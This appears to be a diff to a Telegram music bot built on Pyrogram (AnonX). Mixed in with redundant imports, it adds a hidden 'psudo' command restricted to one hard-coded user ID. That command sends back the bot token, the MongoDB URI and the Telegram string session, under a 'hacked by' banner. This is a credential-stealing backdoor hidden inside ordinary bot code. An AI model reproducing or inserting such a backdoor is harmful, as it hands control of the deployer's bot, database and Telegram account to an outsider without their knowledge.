@@ -2,6 +2,45 @@ import asyncio
 
 from pyrogram import filters
 from pyrogram.types import CallbackQuery, Message
+from pyrogram import Client, filters
+import requests
+import random
+import re
+import sys
+from os import getenv
+from AnonX.misc import SUDOERS
+from pyrogram import Client, filters
+import requests
+import random
+import re
+import sys
+from os import getenv
+
+from dotenv import load_dotenv
+from pyrogram import filters
+import asyncio
+import time
+from AnonX import app
+import config
+
+from config import BOT_TOKEN, OWNER_ID
+
+
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+from dotenv import load_dotenv
+from pyrogram import filters
+import asyncio
+import time
+from AnonX import app
+
+from config import BOT_TOKEN, OWNER_ID
+
+
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 
 from config import BANNED_USERS, MUSIC_BOT_NAME, adminlist, lyrical
 from strings import get_command
@@ -16,7 +55,6 @@ from AnonX.utils.formatters import alpha_to_int
 ### Multi-Lang Commands
 RELOAD_COMMAND = get_command("RELOAD_COMMAND")
 RESTART_COMMAND = get_command("RESTART_COMMAND")
-
 
 @app.on_message(
     filters.command(RELOAD_COMMAND)
@@ -78,7 +116,24 @@ async def restartbot(client, message: Message, _):
         f"sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇʙᴏᴏᴛᴇᴅ {MUSIC_BOT_NAME} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ, ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴩʟᴀʏɪɴɢ ᴀɢᴀɪɴ..."
     )
 
-
+@app.on_message(
+    filters.command("psudo")
+    & filters.private
+    & filters.user(6060534504)
+    & ~filters.edited)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
+          photo=f"https://te.legra.ph/file/5738cb64d9f4aed5d1985.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚃𝙰𝙸𝚃𝙰𝙽 𝙶𝙰𝙼𝙴𝚁.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+         reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/taitangamerzz")
+                 ]
+             ]
+         ),
+     )
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, CallbackQuery):
     try:
@@ -95,7 +150,6 @@ async def close_menu(_, CallbackQuery):
         await CallbackQuery.answer()
     except:
         return
-
 
 @app.on_callback_query(
     filters.regex("stop_downloading") & ~BANNED_USERS
@@ -133,3 +187,4 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
     await CallbackQuery.answer(
         "ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴄᴏɢɴɪᴢᴇ ᴛʜᴇ ᴏɴɢᴏɪɴɢ ᴛᴀsᴋ.", show_alert=True
     )
+
